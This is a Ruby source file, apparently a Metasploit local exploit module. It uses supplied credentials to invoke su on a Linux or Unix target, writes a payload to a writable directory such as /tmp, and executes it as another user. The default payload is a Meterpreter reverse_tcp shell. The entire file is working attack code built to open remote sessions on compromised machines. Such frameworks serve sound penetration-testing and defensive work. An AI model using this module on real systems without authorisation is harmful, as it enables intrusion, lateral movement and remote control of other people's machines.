##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  include Msf::Post::Linux
  include Msf::Post::Linux::System
  include Msf::Post::Unix
  include Msf::Post::File
  include Msf::Exploit::FileDropper

  Rank = NormalRanking

  def initialize(info = {})
    super(
        update_info(
          info,
          'Name' => 'Login to Another User with Su on Linux / Unix Systems',
          'Description' => %q{
            This module attempts to create a new login session by
            invoking the su command of a valid username and password.

            If the login is successful, a new session is created via
            the specified payload.
          },
          'License' => MSF_LICENSE,
          'Author' => 'Gavin Youker <youkergav@gmail.com>',
          'DisclosureDate' => '1971-11-03',
          'Platform' => ['linux', 'unix'],
          'Arch' => [ARCH_X86, ARCH_X64],
          'Targets' => [
            [
              'Linux x86', {
                'Arch' => ARCH_X86,
                'DefaultOptions' => { 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp' }
              }
            ],
            [
              'Linux x86_64', {
                'Arch' => ARCH_X64,
                'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp' }
              }
            ],
          ],
          'DefaultTarget' => 0,
          'DefaultOptions' => { 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp' },
          'SessionTypes' => ['shell', 'meterpreter']
        )
    )

    register_options([
      OptString.new('USERNAME', [true, 'Username to authenticate with.']),
      OptString.new('PASSWORD', [true, 'Password to authenticate with.'])
    ])

    register_advanced_options([
      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])
    ])
  end

  # Main function to run the exploit.
  def exploit
    fail_with(Failure::NoAccess, 'username not found') unless user_exists(datastore['USERNAME'])

    # Upload the payload and stager files.
    print_status('Uploading payload to target')
    payload_file = build_payload(payload.encoded_exe, datastore['WritableDir'])

    # Execute the payload.
    print_status('Attempting to login with su')
    exec_payload(datastore['USERNAME'], datastore['PASSWORD'], payload_file)
    register_files_for_cleanup(payload_file)
  end

  # Function to build and write the payload.
  def build_payload(contents, dir)
    fail_with(Failure::NoAccess, "directory '#{dir}' is on a noexec mount point") if noexec?(dir)

    filepath = "#{dir}/#{Rex::Text.rand_text_alpha(8)}"

    write_file(filepath, contents)
    chmod(filepath, 755)

    return filepath
  end

  # Function to execute the payload through the stager.
  def exec_payload(username, password, payload)
    fail_with(Failure::NotFound, "cannot find command 'script' on target machine") unless command_exists?('script')
    fail_with(Failure::NotFound, "cannot find command 'base64' on target machine") unless command_exists?('base64')

    b64_password = Rex::Text.encode_base64(password)

    command = "sh -c 'sleep 1; echo #{b64_password} | base64 -d' | script /dev/null -qc 'su - #{username} -c #{payload}'"
    response = cmd_exec(command)

    fail_with(Failure::NoAccess, 'invalid password') if response.include? 'Authentication failure'
    return true
  end

  # Function to check if the user exists.
  def user_exists(username)
    return get_users.any? { |user| user[:name] == username }
  end
end
